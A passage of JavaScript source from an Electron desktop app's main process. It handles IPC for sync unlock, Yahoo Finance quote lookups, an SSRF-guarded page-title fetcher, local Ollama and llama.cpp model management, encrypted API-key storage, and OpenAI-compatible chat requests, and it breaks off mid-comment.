ipcMain.handle('sync-encryption-unlock', (event, passphrase) => {
    const res = unlockSyncKeyWithPassphrase(passphrase);
    // On success, run the merge that was skipped while locked so the Mac
    // catches up immediately rather than waiting for the next refresh.
    if (res && res.ok) { try { mergeFromOtherMachines(); } catch {} }
    return res;
});

ipcMain.handle('sync-encryption-change-passphrase', (event, newPassphrase) => changeSyncPassphrase(newPassphrase));

// Yahoo Finance crumb/cookie cache for authenticated API calls
let yahooCrumb = null;
let yahooCookie = null;
let yahooCrumbExpiry = 0;

function httpsGet(url, headers = {}) {
    return new Promise((resolve, reject) => {
        const options = new URL(url);
        const req = https.get({
            hostname: options.hostname,
            path: options.pathname + options.search,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                ...headers
            }
        }, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve({ statusCode: res.statusCode, headers: res.headers, body: data }));
        });
        req.on('error', reject);
        req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
    });
}

async function getYahooCrumb() {
    if (yahooCrumb && Date.now() < yahooCrumbExpiry) {
        return { crumb: yahooCrumb, cookie: yahooCookie };
    }

    // Step 1: Get cookie from Yahoo Finance consent/main page
    const consentRes = await httpsGet('https://fc.yahoo.com/');
    const setCookies = consentRes.headers['set-cookie'] || [];
    const cookies = setCookies.map(c => c.split(';')[0]).join('; ');

    if (!cookies) return null;

    // Step 2: Get crumb using the cookie
    const crumbRes = await httpsGet('https://query2.finance.yahoo.com/v1/test/getcrumb', { Cookie: cookies });

    if (crumbRes.statusCode !== 200 || !crumbRes.body) return null;

    yahooCrumb = crumbRes.body;
    yahooCookie = cookies;
    yahooCrumbExpiry = Date.now() + 30 * 60 * 1000; // 30 min

    return { crumb: yahooCrumb, cookie: yahooCookie };
}

function fetchTitle(url, redirects = 0) {
    if (redirects > 5) return Promise.resolve({ title: null });
    try {
        const parsedUrl = new URL(url);
        // Scheme guard + SSRF: never let a bookmark/model URL reach file:// or a
        // private host via the title fetcher.
        if (parsedUrl.protocol !== 'http:' && parsedUrl.protocol !== 'https:') {
            return Promise.resolve({ title: null });
        }
        const getFn = parsedUrl.protocol === 'http:' ? http.get : https.get;

        return new Promise((resolve) => {
            const req = getFn(url, {
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
                },
                timeout: 8000,
                lookup: _guardedLookup  // SSRF guard: reject private/loopback resolutions
            }, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    let redirectUrl = res.headers.location;
                    if (redirectUrl.startsWith('/')) {
                        redirectUrl = `${parsedUrl.protocol}//${parsedUrl.host}${redirectUrl}`;
                    }
                    res.resume();
                    resolve(fetchTitle(redirectUrl, redirects + 1));
                    return;
                }

                let data = '';
                let resolved = false;
                res.on('data', chunk => {
                    data += chunk;
                    // Check for title in accumulated data
                    if (!resolved) {
                        const match = data.match(/<title[^>]*>([^<]+)<\/title>/i);
                        if (match) {
                            resolved = true;
                            res.destroy();
                            resolve({ title: match[1].trim() });
                        }
                    }
                    if (data.length > 50000 && !resolved) {
                        resolved = true;
                        res.destroy();
                        resolve({ title: null });
                    }
                });
                res.on('end', () => {
                    if (!resolved) {
                        resolved = true;
                        const match = data.match(/<title[^>]*>([^<]+)<\/title>/i);
                        resolve({ title: match ? match[1].trim() : null });
                    }
                });
                res.on('error', () => {
                    if (!resolved) { resolved = true; resolve({ title: null }); }
                });
                res.on('close', () => {
                    if (!resolved) { resolved = true; resolve({ title: null }); }
                });
            });
            req.on('error', () => resolve({ title: null }));
            req.on('timeout', () => { req.destroy(); resolve({ title: null }); });
        });
    } catch (e) {
        return Promise.resolve({ title: null });
    }
}

ipcMain.handle('fetch-url-title', async (event, url) => {
    return fetchTitle(url);
});

ipcMain.handle('yahoo-quote-summary', async (event, ticker, modules) => {
    try {
        const mods = (typeof modules === 'string' && /^[a-zA-Z,]+$/.test(modules)) ? modules : 'assetProfile,quoteType';
        const auth = await getYahooCrumb();
        if (!auth) return null;

        const url = `https://query2.finance.yahoo.com/v10/finance/quoteSummary/${encodeURIComponent(ticker)}?modules=${mods}&crumb=${encodeURIComponent(auth.crumb)}`;
        const res = await httpsGet(url, { Cookie: auth.cookie });

        if (res.statusCode !== 200) {
            // Crumb may have expired, reset and retry once
            yahooCrumb = null;
            const auth2 = await getYahooCrumb();
            if (!auth2) return null;

            const url2 = `https://query2.finance.yahoo.com/v10/finance/quoteSummary/${encodeURIComponent(ticker)}?modules=${mods}&crumb=${encodeURIComponent(auth2.crumb)}`;
            const res2 = await httpsGet(url2, { Cookie: auth2.cookie });
            if (res2.statusCode !== 200) return null;

            const data2 = JSON.parse(res2.body);
            return data2?.quoteSummary?.result?.[0] || null;
        }

        const data = JSON.parse(res.body);
        return data?.quoteSummary?.result?.[0] || null;
    } catch (error) {
        console.error('Failed to fetch Yahoo quote summary:', error);
        return null;
    }
});

// Ollama LLM IPC handlers
// Merge every system message into a single leading one. The agent now sends
// ONE system message (volatile context rides the newest user message — see
// AgentService.buildSystemMessages), so this is a passthrough for it; kept
// because other callers may still send several and strict chat templates
// (qwen3.x) raise_exception on any system message that isn't the very first.
function mergeSystemMessages(messages) {
    const msgs = messages || [];
    if (msgs.filter(m => m.role === 'system').length <= 1) return msgs;
    const system = msgs.filter(m => m.role === 'system');
    return [
        { ...system[0], content: system.map(m => m.content).filter(Boolean).join('\n\n') },
        ...msgs.filter(m => m.role !== 'system')
    ];
}

// Build an Ollama chat request body with proper thinking/tool handling
function buildOllamaChatBody(params) {
    const body = {
        model: params.model,
        messages: mergeSystemMessages(params.messages),
        tools: params.tools,
        options: params.options,
        stream: params.stream !== undefined ? params.stream : false,
        // Default OFF: every caller in this app (agent tool loops, email JSON
        // extraction, quote-of-the-day, summaries) wants the final answer, not a
        // reasoning trace. On small models with thinking-on by default (gemma4,
        // qwen3), the hidden <think> block is the single biggest latency hit.
        // Ollama ignores this field for non-thinking models. Callers that
        // genuinely want reasoning can pass think: true.
        think: params.think === true
    };
    // Forward keep_alive if provided (Ollama's API reads it at the top level, not inside options)
    if (params.keep_alive !== undefined) body.keep_alive = params.keep_alive;
    // Forward format ('json' or a JSON schema) — constrains Ollama's sampler
    // to valid JSON. Callers that parse structured output (e.g. the trading
    // strategy compiler) rely on this.
    if (params.format !== undefined) body.format = params.format;
    return body;
}

// Strip <think>...</think> tags from Ollama response content (for non-streaming)
function stripThinkTags(result) {
    if (result?.message?.content) {
        result.message.content = result.message.content.replace(/<think>[\s\S]*?<\/think>/g, '').trim();
    }
    return result;
}

function ollamaRequest(method, path, body) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: '127.0.0.1',
            port: OllamaManager.port,
            path: path,
            method: method,
            headers: { 'Content-Type': 'application/json' }
        };

        const req = http.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                if (!data.trim() && res.statusCode >= 200 && res.statusCode < 300) {
                    resolve({ success: true });
                } else {
                    try {
                        resolve(JSON.parse(data));
                    } catch {
                        resolve({ error: `HTTP ${res.statusCode}: ${data.slice(0, 200) || 'empty response'}` });
                    }
                }
            });
        });

        req.on('error', (e) => { console.error('[ollama] Request error:', e.message); reject(e); });
        req.setTimeout(600000, () => { req.destroy(); reject(new Error('Ollama request timeout after 10 minutes')); });

        if (body) {
            req.write(JSON.stringify(body));
        }
        req.end();
    });
}

ipcMain.handle('ollama-chat', async (event, params) => {
    try {
        return stripThinkTags(await ollamaRequest('POST', '/api/chat', buildOllamaChatBody(params)));
    } catch (e) {
        return { error: e.message || 'Failed to connect to Ollama' };
    }
});

ipcMain.handle('ollama-check', async () => {
    try {
        return await ollamaRequest('GET', '/api/tags');
    } catch {
        return null;
    }
});

ipcMain.handle('ollama-pull-model', async (event, modelName) => {
    const sender = event.sender;
    try {
        await OllamaManager.pullModel(modelName, (progress) => {
            sender.send('ollama-pull-progress', progress);
        });
        return { success: true };
    } catch (e) {
        return { error: e.message };
    }
});

// Download + install Ollama.app on macOS. URL comes from RemoteConfig so we can
// update it without shipping a new app version — with a hardcoded fallback in
// case the config hasn't loaded yet (e.g., offline first launch is unreachable
// anyway, but at least we don't 500 on a missing field).
ipcMain.handle('ollama-install', async (event) => {
    const sender = event.sender;
    try {
        const cfg = RemoteConfig.get() || {};
        const url = cfg?.ollamaInstall?.macUrl || 'https://ollama.com/download/Ollama-darwin.zip';
        const result = await OllamaManager.installFromUrl(url, (progress) => {
            sender.send('ollama-install-progress', progress);
        });
        return result;
    } catch (e) {
        return { error: e.message || 'Install failed' };
    }
});

ipcMain.handle('ollama-status', async () => {
    let version = null;
    if (OllamaManager.isReady) {
        try { version = await OllamaManager.getVersion(); } catch {}
    }
    return {
        isReady: OllamaManager.isReady,
        isInstalled: !!OllamaManager.getBinaryPath(),
        port: OllamaManager.port,
        version
    };
});

ipcMain.handle('ollama-start', async () => {
    try {
        return await OllamaManager.start();
    } catch {
        return false;
    }
});

ipcMain.handle('ollama-list-models', async () => {
    try {
        return await OllamaManager.listModels();
    } catch {
        return { models: [] };
    }
});

ipcMain.handle('ollama-delete-model', async (event, modelName) => {
    try {
        return await OllamaManager.deleteModel(modelName);
    } catch (e) {
        return { error: e.message || 'Failed to delete model' };
    }
});

// Which models are currently resident in memory (distinct from /api/tags,
// which lists installed-but-maybe-cold models). Used to gate redundant
// prewarm calls and to drive the "Unload" UI.
ipcMain.handle('ollama-ps', async () => {
    try {
        return await ollamaRequest('GET', '/api/ps');
    } catch {
        return { models: [] };
    }
});

// Evict a model from memory immediately to free RAM. Ollama unloads a model
// when it receives a request with keep_alive: 0; an empty /api/generate call
// is the lightest way to send that signal (no prompt processed).
ipcMain.handle('ollama-unload', async (event, modelName) => {
    if (!modelName) return { error: 'No model specified' };
    try {
        return await ollamaRequest('POST', '/api/generate', { model: modelName, keep_alive: 0 });
    } catch (e) {
        return { error: e.message || 'Failed to unload model' };
    }
});

// --- llama.cpp engine IPC handlers ---
// Second first-class local engine (llamacpp/llamacpp-manager.js). Chat traffic
// doesn't go through these — the unified llm-chat/llm-chat-stream handlers
// route the 'local' provider to llama-server's OpenAI-compatible endpoint
// when localBackend === 'llamacpp'. These handlers cover engine lifecycle
// and model management, mirroring the ollama-* set.

// Which local engine the 'local' provider uses. Machine-local (settingsStore):
// which engine runs best depends on this Mac, exactly like the model choice.
function getLocalBackend() {
    return settingsStore.get('localBackend', 'ollama');
}

// Look up a catalog model's GGUF source for llama.cpp downloads.
function getCatalogGguf(modelName) {
    const models = (RemoteConfig.get() || {}).models || [];
    const entry = models.find(m => m.name === modelName);
    return entry && entry.gguf ? entry.gguf : null;
}

ipcMain.handle('llamacpp-status', async () => {
    return {
        isReady: LlamaCppManager.isReady,
        isInstalled: !!LlamaCppManager.getBinaryPath(),
        port: LlamaCppManager.port,
        loadedModel: LlamaCppManager.loadedModel,
        version: LlamaCppManager.getBinaryPath() ? LlamaCppManager.getVersion() : null
    };
});

ipcMain.handle('llamacpp-install', async (event) => {
    const cfg = RemoteConfig.get() || {};
    const install = cfg.llamacppInstall || {};
    const isArm = process.arch === 'arm64';
    const url = isArm
        ? (install.macArm64Url || 'https://github.com/ggml-org/llama.cpp/releases/download/b10015/llama-b10015-bin-macos-arm64.tar.gz')
        : (install.macX64Url || 'https://github.com/ggml-org/llama.cpp/releases/download/b10015/llama-b10015-bin-macos-x64.tar.gz');
    // Arch-matched SHA-256 pin (SECURITY-AUDIT.md M4). Absent → install
    // proceeds with a warning (manager logs it); present → mismatch aborts.
    const sha = isArm ? install.macArm64Sha256 : install.macX64Sha256;
    try {
        const result = await LlamaCppManager.installFromUrl(url, (progress) => {
            try { event.sender.send('llamacpp-install-progress', progress); } catch {}
        }, sha);
        return result;
    } catch (e) {
        return { error: e.message || 'Engine install failed' };
    }
});

ipcMain.handle('llamacpp-pull-model', async (event, modelName) => {
    await RemoteConfig.load();
    const gguf = getCatalogGguf(modelName);
    try {
        return await LlamaCppManager.pullModel(modelName, gguf, (progress) => {
            try { event.sender.send('llamacpp-pull-progress', progress); } catch {}
        });
    } catch (e) {
        return { error: e.message || 'Model download failed' };
    }
});

ipcMain.handle('llamacpp-list-models', async () => {
    try {
        return await LlamaCppManager.listModels();
    } catch {
        return { models: [] };
    }
});

ipcMain.handle('llamacpp-delete-model', async (event, modelName) => {
    try {
        return await LlamaCppManager.deleteModel(modelName);
    } catch (e) {
        return { error: e.message || 'Failed to delete model' };
    }
});

// Preload the selected model into llama-server (the llama.cpp analogue of an
// Ollama prewarm). Heavy — spawns the server and maps the GGUF — so callers
// only use it on engine/model switches, not on every chat.
ipcMain.handle('llamacpp-start', async (event, params) => {
    try {
        // Accept both the {modelName, numCtx} object and the legacy bare
        // model-name string. An explicit numCtx (the caller's per-entry
        // value) wins over the machine-global setting.
        const modelName = (params && typeof params === 'object') ? params.modelName : params;
        const explicitCtx = (params && typeof params === 'object') ? Number(params.numCtx) : 0;
        const numCtx = (Number.isFinite(explicitCtx) && explicitCtx > 0)
            ? explicitCtx
            : settingsStore.get('agentNumCtx', 0);
        const ok = await LlamaCppManager.ensureModel(modelName, numCtx);
        return { success: ok };
    } catch (e) {
        return { error: e.message || 'Failed to start llama-server' };
    }
});

// Free the model's RAM. llama-server has no keep_alive-style eviction — the
// process IS the loaded model, so unload = stop.
ipcMain.handle('llamacpp-unload', async () => {
    LlamaCppManager.stop(false);
    return { success: true };
});

// --- Remote Config ---

ipcMain.handle('remote-config-get', async () => {
    await RemoteConfig.load();
    return RemoteConfig.get();
});

// --- Custom server (OpenAI-compatible) credentials ---


// --- Custom OpenAI-compatible endpoint (local llama.cpp/llama-server, vLLM,
// LM Studio, Ollama's own /v1, or a remote OpenAI-compatible API). The endpoint
// and model name depend on what THIS machine can reach, so they live in the
// machine-local settingsStore and are never synced (encrypted via
// and num_ctx). The optional key is encrypted with the same safeStorage pattern. ---
function getCustomApiKey() {
    const stored = settingsStore.get('customApiKey', null);
    if (!stored) return null;
    if (safeStorage.isEncryptionAvailable()) {
        try { return safeStorage.decryptString(Buffer.from(stored, 'base64')); }
        catch {
            // Can't decrypt: foreign-keychain ciphertext or a pre-hardening
            // plaintext value. We no longer hand the raw stored bytes back as
            // a key (M9 review: it was sent verbatim as a Bearer token) —
            // drop it so the user re-enters and it's saved encrypted.
            console.warn('[llm] stored custom API key could not be decrypted — ignoring');
            return null;
        }
    }
    return stored; // keychain unavailable — only legacy plaintext could be here
}

// Returns true on success, false when the key could not be stored securely
// (M9: fail closed — never write an API key to disk in cleartext).
function setCustomApiKey(key) {
    if (!key) { settingsStore.delete('customApiKey'); return true; }
    if (!safeStorage.isEncryptionAvailable()) {
        console.warn('[llm] refusing to store custom API key — OS keychain (safeStorage) unavailable');
        return false;
    }
    settingsStore.set('customApiKey', safeStorage.encryptString(key).toString('base64'));
    return true;
}

function getCustomConfig() {
    return {
        baseUrl: settingsStore.get('customBaseUrl', ''),
        model: settingsStore.get('customModel', ''),
        apiKey: getCustomApiKey()
    };
}

// --- Per-entry API keys for server model entries (the assistant's model
// list). Each server entry carries its own endpoint; its key is stored here
// encrypted, keyed by the entry id — same safeStorage pattern as the legacy
// customApiKey. Machine-local, never synced. ---
function getEntryApiKey(entryId, baseUrl) {
    const keys = settingsStore.get('serverEntryKeys', {});
    const stored = entryId && keys[entryId];
    if (stored) {
        if (safeStorage.isEncryptionAvailable()) {
            try { return safeStorage.decryptString(Buffer.from(stored, 'base64')); }
            catch {
                // Foreign-keychain ciphertext or pre-hardening plaintext — do
                // NOT return the raw stored bytes as a key (M9 review). Ignore
                // it; the user re-enters and it's re-saved encrypted.
                console.warn('[llm] stored API key for entry could not be decrypted — ignoring');
                return null;
            }
        }
        return stored; // keychain unavailable — only legacy plaintext could be here
    }
    // Entries migrated from the legacy single-server config have no key of
    // their own — reuse the legacy key, but ONLY for the endpoint it was
    // saved for (never leak it to a different server the user adds later).
    if (!baseUrl || baseUrl === settingsStore.get('customBaseUrl', '')) return getCustomApiKey();
    return null;
}

// Returns true on success, false when the key could not be stored securely
// (M9: fail closed — never persist an API key in cleartext).
function setEntryApiKey(entryId, key) {
    if (!entryId) return false;
    const keys = settingsStore.get('serverEntryKeys', {});
    if (!key) {
        delete keys[entryId];
        settingsStore.set('serverEntryKeys', keys);
        return true;
    }
    if (!safeStorage.isEncryptionAvailable()) {
        console.warn('[llm] refusing to store API key for entry — OS keychain (safeStorage) unavailable');
        return false;
    }
    keys[entryId] = safeStorage.encryptString(key).toString('base64');
    settingsStore.set('serverEntryKeys', keys);
    return true;
}

// Resolve the request config for a server-engine turn: the entry's own
// endpoint + key, with the legacy single-server settings as fallback for
// migrated entries that never saved their own.
function serverEntryConfig(params) {
    const legacy = getCustomConfig();
    const baseUrl = (params.baseUrl || legacy.baseUrl || '').trim();
    return {
        baseUrl,
        model: params.model || legacy.model,
        apiKey: getEntryApiKey(params.entryId, baseUrl)
    };
}

// Config for chatting with the managed llama-server over its OpenAI-compatible
// endpoint — the 'local' provider's request path when localBackend is
// 'llamacpp'. ensureModel() guarantees the server is up and serving
// params.model (restarting it on model or context-size changes; llama-server
// binds one process to one GGUF). The renderer-derived num_ctx doubles as the
// server's -c flag, so both engines honor the same context setting.
async function llamaCppChatConfig(params) {
    const numCtx = (params.options && params.options.num_ctx) || settingsStore.get('agentNumCtx', 0);
    await LlamaCppManager.ensureModel(params.model, numCtx);
    return { baseUrl: `http://127.0.0.1:${LlamaCppManager.port}/v1`, model: params.model, apiKey: LlamaCppManager.apiKey };
}

// Normalize a user-entered base URL to the chat-completions endpoint. Accepts
// a bare host ("http://host:8080"), a "/v1" path, or a full ".../chat/completions".
function customChatEndpoint(baseUrl) {
    const u = String(baseUrl || '').trim().replace(/\/+$/, '');
    return /\/chat\/completions$/.test(u) ? u : `${u}/chat/completions`;
}

// Strip <think>...</think> reasoning tags from a plain string (non-streaming path).
function stripThinkText(s) {
    return String(s || '').replace(/<think>[\s\S]*?<\/think>/g, '').trim();
}

// The agent's working history is already OpenAI-shaped, but a strict server
// (llama-server) wants: assistant tool_calls with type:'function' and a STRING
// arguments field, and tool messages carrying tool_call_id. Normalize to that
// and drop app-internal fields (_cacheable, metadata, …).
function toOpenAIMessages(messages) {
    return mergeSystemMessages(messages || []).map((m, mi) => {
        if (m.role === 'assistant' && Array.isArray(m.tool_calls) && m.tool_calls.length) {
            return {
                role: 'assistant',
                content: m.content || '',
                tool_calls: m.tool_calls.map((tc, i) => ({
                    id: tc.id || `call_${mi}_${i}`,
                    type: 'function',
                    function: {
                        name: tc.function?.name,
                        arguments: typeof tc.function?.arguments === 'string'
                            ? tc.function.arguments
                            : JSON.stringify(tc.function?.arguments || {})
                    }
                }))
            };
        }
        if (m.role === 'tool') {
            return {
                role: 'tool',
                content: typeof m.content === 'string' ? m.content : JSON.stringify(m.content),
                tool_call_id: m.tool_call_id || m.name || `tool_${mi}`
            };
        }
        return { role: m.role, content: m.content || '' };
    });
}

// Non-streaming OpenAI-compatible chat. Returns the same shape as the Ollama /
// path ({ message:{role,content,tool_calls}, error }).
function openaiRequest(cfg, messages, tools, maxTokens, format) {
    return new Promise((resolve) => {
        if (!cfg || !cfg.baseUrl) { resolve({ error: 'No server URL configured (Settings → AI Models).' }); return; }
        let endpoint;
        try { endpoint = new URL(customChatEndpoint(cfg.baseUrl)); }
        catch { resolve({ error: `Invalid server URL: ${cfg.baseUrl}` }); return; }

        const bodyObj = {
            model: cfg.model || 'local-model',
            messages: toOpenAIMessages(messages),
            stream: false
        };
        // api.openai.com deprecated `max_tokens` in favor of
        // `max_completion_tokens` (reasoning models reject the old name);
        // self-hosted servers all still speak `max_tokens`. The cloud config
        // sets tokenParam; everything else defaults to the legacy name.
        // Reasoning models on api.openai.com spend hidden reasoning tokens
        // inside this cap — the self-hosted 4096 default would starve the
        // visible reply, so cloud requests get a higher floor.
        bodyObj[cfg.tokenParam || 'max_tokens'] = maxTokens || (cfg.tokenParam ? 16000 : 4096);
        // Mirror Ollama's `format: 'json'` on the OpenAI-compatible path —
        // llama-server / vLLM / LM Studio all accept response_format, and the
        // JSON-classifier callers (email bundles, action filing) depend on
        // constrained output surviving small models' prose habits.
        if (format === 'json') bodyObj.response_format = { type: 'json_object' };
        // A JSON-schema object rides the OpenAI json_schema envelope —
        // llama-server compiles it into a sampling grammar (same as Ollama's
        // schema format); vLLM / LM Studio / api.openai.com accept it too.
        // Deliberately non-strict: strict mode forbids optional properties,
        // which the builder's escape-hatch schema needs. Servers that don't
        // speak json_schema return an error; callers downgrade to 'json'.
        else if (format && typeof format === 'object') {
            bodyObj.response_format = { type: 'json_schema', json_schema: { name: 'structured_output', schema: format } };
        }
        if (tools && tools.length) { bodyObj.tools = tools; bodyObj.tool_choice = 'auto'; }
        const postData = JSON.stringify(bodyObj);

        const lib = endpoint.protocol === 'https:' ? https : http;
        const headers = { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) };
        if (cfg.apiKey) headers['Authorization'] = `Bearer ${cfg.apiKey}`;

        const req = lib.request({
            hostname: endpoint.hostname,
            port: endpoint.port || (endpoint.protocol === 'https:' ? 443 : 80),
            path: endpoint.pathname + endpoint.search,
            method: 'POST',
            headers
        }, (res) => {
            let data = '';
            res.on('data', c => data += c.toString());
            res.on('end', () => {
                if (res.statusCode !== 200) {
                    let msg = `Server error (${res.statusCode})`;
                    try { const p = JSON.parse(data); msg = p.error?.message || p.error || msg; }
                    catch { if (data) msg += `: ${data.slice(0, 300)}`; }
                    resolve({ error: msg });
                    return;
                }
                try {
                    const p = JSON.parse(data);
                    const choice = p.choices?.[0]?.message || {};
                    const message = { role: 'assistant', content: stripThinkText(choice.content || '') };
                    if (Array.isArray(choice.tool_calls) && choice.tool_calls.length) {
                        message.tool_calls = choice.tool_calls.map(tc => ({
                            id: tc.id,
                            function: { name: tc.function?.name, arguments: tc.function?.arguments }
                        }));
                    }
                    const out = {
                        message, model: p.model, provider: cfg.provider || 'custom',
                        prompt_eval_count: p.usage?.prompt_tokens,
                        eval_count: p.usage?.completion_tokens
                    };
                    // llama-server extension: timings.prompt_n = tokens actually
                    // prefilled this request, timings.cache_n = tokens reused from
                    // the slot's KV cache. The single most direct measure of
                    // whether the prompt prefix is caching across turns.
                    if (p.timings) out.timings = p.timings;
                    resolve(out);
                } catch (e) {
                    resolve({ error: `Failed to parse server response: ${e.message}` });
                }
            });
        });
        req.on('error', e => resolve({ error: e.message }));
        req.setTimeout(600000, () => { req.destroy(); resolve({ error: 'Server request timed out (10 min)' }); });
        req.write(postData);
        req.end();
    });
}

// Streaming OpenAI-compatible chat — parses the SSE `data:` stream, forwards
// content on 'llm-stream-chunk' and any <think>…</think> (or reasoning_content)
// on the thinking channel, accumulates streamed tool_calls by index, and
// resolves with the same {message,…} contract as ollamaStreamRequest.
function openaiStreamRequest(cfg, messages, tools, maxTokens, sender, streamId) {
    return new Promise((origResolve, origReject) => {
        let settled = false, aborted = false;
        const resolve = (v) => { if (settled) return; settled = true; if (streamId) activeLLMStreams.delete(streamId); origResolve(v); };
        const reject = (e) => { if (settled) return; settled = true; if (streamId) activeLLMStreams.delete(streamId); origReject(e); };

        if (!cfg || !cfg.baseUrl) { resolve({ error: 'No server URL configured (Settings → AI Models).' }); return; }
        let endpoint;
        try { endpoint = new URL(customChatEndpoint(cfg.baseUrl)); }
        catch { resolve({ error: `Invalid server URL: ${cfg.baseUrl}` }); return; }

        const bodyObj = {
            model: cfg.model || 'local-model',
            messages: toOpenAIMessages(messages),
            stream: true,
            // Ask for usage in the final chunk (OpenAI spec; llama-server,
            // vLLM and LM Studio all honor it) so prompt/completion token
            // counts survive the streaming path too.
            stream_options: { include_usage: true }
        };
        // Same token-cap naming split as the non-streaming path.
        // Reasoning models on api.openai.com spend hidden reasoning tokens
        // inside this cap — the self-hosted 4096 default would starve the
        // visible reply, so cloud requests get a higher floor.
        bodyObj[cfg.tokenParam || 'max_tokens'] = maxTokens || (cfg.tokenParam ? 16000 : 4096);
        if (tools && tools.length) { bodyObj.tools = tools; bodyObj.tool_choice = 'auto'; }
        const postData = JSON.stringify(bodyObj);

        const lib = endpoint.protocol === 'https:' ? https : http;
        const headers = {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData),
            'Accept': 'text/event-stream'
        };
        if (cfg.apiKey) headers['Authorization'] = `Bearer ${cfg.apiKey}`;

        const req = lib.request({
            hostname: endpoint.hostname,
            port: endpoint.port || (endpoint.protocol === 'https:' ? 443 : 80),
            path: endpoint.pathname + endpoint.search,
            method: 'POST',
            headers
        }, (res) => {
            let buffer = '';
            let accumulatedContent = '';
            const toolCallsByIndex = new Map(); // index -> { id, name, args }
            let usage = null, timings = null, responseModel = cfg.model;
            // Same <think>-tag state machine as the Ollama path, so reasoning is
            // surfaced on its own channel instead of polluting the answer.
            let inThink = false, thinkBuf = '', sentThinkingIndicator = false, sentThinkingDone = false;

            if (res.statusCode !== 200) {
                let errorBody = '';
                res.on('data', c => errorBody += c.toString());
                res.on('end', () => {
                    let msg = `Server error (${res.statusCode})`;
                    try { const p = JSON.parse(errorBody); msg = p.error?.message || p.error || msg; }
                    catch { if (errorBody) msg += `: ${errorBody.slice(0, 300)}`; }
                    console.error(`[openai-stream] HTTP ${res.statusCode}: ${msg}`);
                    resolve({ error: msg });
                });
                return;
            }
            console.log(`[openai-stream] streaming from ${endpoint.host} model="${bodyObj.model}" (status ${res.statusCode})`);

            const emitContent = (text) => {
                for (let i = 0; i < text.length; i++) {
                    const ch = text[i];
                    if (inThink) {
                        thinkBuf += ch;
                        if (thinkBuf.endsWith('</think>')) {
                            const t = thinkBuf.slice(0, -8);
                            if (t) sender.send('llm-stream-thinking', t, streamId);
                            thinkBuf = ''; inThink = false;
                            if (sentThinkingIndicator && !sentThinkingDone) { sentThinkingDone = true; sender.send('llm-stream-thinking-done', streamId); }
                        }
                    } else {
                        thinkBuf += ch;
                        if ('<think>'.startsWith(thinkBuf)) {
                            if (thinkBuf === '<think>') { inThink = true; thinkBuf = ''; sentThinkingIndicator = true; }
                        } else {
                            accumulatedContent += thinkBuf;
                            sender.send('llm-stream-chunk', thinkBuf, streamId);
                            thinkBuf = '';
                        }
                    }
                }
            };

            const processEvent = (obj) => {
                if (obj.usage) usage = obj.usage;
                // llama-server puts a `timings` object on the final chunk:
                // prompt_n = tokens prefilled, cache_n = tokens reused from the
                // slot's KV cache — the direct prefix-cache-hit diagnostic.
                if (obj.timings) timings = obj.timings;
                if (obj.model) responseModel = obj.model;
                const choice = obj.choices?.[0];
                if (!choice) return;
                const delta = choice.delta || {};
                if (delta.reasoning_content) {
                    sentThinkingIndicator = true;
                    sender.send('llm-stream-thinking', delta.reasoning_content, streamId);
                }
                if (typeof delta.content === 'string' && delta.content) {
                    if (sentThinkingIndicator && !sentThinkingDone) { sentThinkingDone = true; sender.send('llm-stream-thinking-done', streamId); }
                    emitContent(delta.content);
                }
                if (Array.isArray(delta.tool_calls)) {
                    for (const tc of delta.tool_calls) {
                        const idx = tc.index ?? 0;
                        let entry = toolCallsByIndex.get(idx);
                        if (!entry) { entry = { id: tc.id || `call_${idx}`, name: '', args: '' }; toolCallsByIndex.set(idx, entry); }
                        if (tc.id) entry.id = tc.id;
                        if (tc.function?.name) entry.name = tc.function.name;
                        if (tc.function?.arguments) entry.args += tc.function.arguments;
                    }
                }
            };

            res.on('data', chunk => {
                buffer += chunk.toString();
                const lines = buffer.split('\n');
                buffer = lines.pop();
                for (const line of lines) {
                    const t = line.trim();
                    if (!t.startsWith('data:')) continue;
                    const data = t.slice(5).trim();
                    if (data === '[DONE]') continue;
                    try { processEvent(JSON.parse(data)); } catch { /* keep-alive or partial line */ }
                }
            });

            res.on('end', () => {
                if (thinkBuf && !inThink) { accumulatedContent += thinkBuf; sender.send('llm-stream-chunk', thinkBuf, streamId); thinkBuf = ''; }
                if (inThink && thinkBuf) { sender.send('llm-stream-thinking', thinkBuf, streamId); thinkBuf = ''; }
                const message = { role: 'assistant', content: accumulatedContent };
                if (toolCallsByIndex.size) {
                    message.tool_calls = [...toolCallsByIndex.values()].map(e => ({ id: e.id, function: { name: e.name, arguments: e.args } }));
                }
                const cacheNote = timings && typeof timings.cache_n === 'number'
                    ? `, cache=${timings.cache_n} tok reused / ${timings.prompt_n ?? '?'} prefilled`
                    : '';
                console.log(`[openai-stream] done: content=${accumulatedContent.length} chars, tool_calls=${message.tool_calls?.length || 0}${cacheNote}`);
                const out = {
                    message, model: responseModel, provider: cfg.provider || 'custom', usage,
                    prompt_eval_count: usage?.prompt_tokens,
                    eval_count: usage?.completion_tokens
                };
                if (timings) out.timings = timings;
                resolve(out);
            });
        });

        // Abort must settle the promise ITSELF: req.destroy() without an error
        // argument doesn't reliably emit 'error', and a destroyed socket never
        // emits res 'end' — relying on those left the renderer's await hanging
        // forever after Stop (turn never unwound, queued messages never sent).
        if (streamId) activeLLMStreams.set(streamId, () => {
            aborted = true;
            try { req.destroy(); } catch { /* already gone */ }
            console.log('[openai-stream] aborted by user');
            resolve({ aborted: true });
        });
        req.on('error', (e) => {
            if (aborted) { resolve({ aborted: true }); return; }
            console.error('[openai-stream] request error:', e.message);
            resolve({ error: e.message });
        });
        req.setTimeout(600000, () => { req.destroy(); resolve({ error: 'Server stream timed out (10 min)' }); });
        req.write(postData);
        req.end();
    });
}

// --- Cloud AI providers (BYOK: the user's own OpenAI / Anthropic key) ---
// Model entries with engine 'openai' / 'anthropic' talk to the official APIs
// with a key the user pastes in — the per-entry encrypted key store (same as
// server entries) holds it. Base URLs are fixed: these engines exist so the
// key is the ONLY thing the user configures. This is an explicit, per-model
